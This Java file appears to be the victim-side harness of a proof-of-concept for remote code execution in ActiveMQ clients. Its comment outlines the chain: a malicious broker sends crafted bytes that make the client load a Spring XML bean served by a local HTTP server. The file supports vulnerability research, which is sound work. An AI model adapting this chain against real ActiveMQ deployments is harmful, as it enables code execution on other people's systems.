package victim;

import http.HttpServer;
import org.apache.activemq.ActiveMQConnectionFactory;

import javax.jms.Connection;
import javax.jms.JMSException;
import java.io.IOException;

/**
 * This is an ActiveMQ Client connecting to a malicious server which will reply with the exact bytes to go through the
 * code up to the point the Marshaller creates a new Spring XML Loader that downloads the Spring XML Bean to get remote
 * code execution.
 * It also runs a separate Thread for the HTTP server that returns the XML file to each new connection it gets in a loop.
 */
public class ActiveMQClient {

    public static void main(String[] args) throws IOException, InterruptedException {
        final HttpServer httpServer = new HttpServer(8888);
        Thread serverThread = new Thread(httpServer::run);
        serverThread.start();
        try {
            createAmqpConnection();
        } catch (Exception e) {
            System.out.println("An exception occurred " + e.getMessage());
        } finally {
            httpServer.stopRunning();
            serverThread.interrupt();
            serverThread.join();
        }
    }

    private static void createAmqpConnection() {
        // Set the broker URL
        String brokerURL = "tcp://localhost:61616";

        // Create a connection factory
        ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory("user", "password", brokerURL);

        // Create a connection
        try (Connection connection = connectionFactory.createConnection()) {
            // Start the connection
            connection.start();

            // Sleep for 10 seconds to allow remote code execution before terminating the process
            while (true) {
                // When the malicious server closes the socket, this will result in a JMSException. No infinite loop
                Thread.sleep(10000);
            }

        } catch (JMSException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
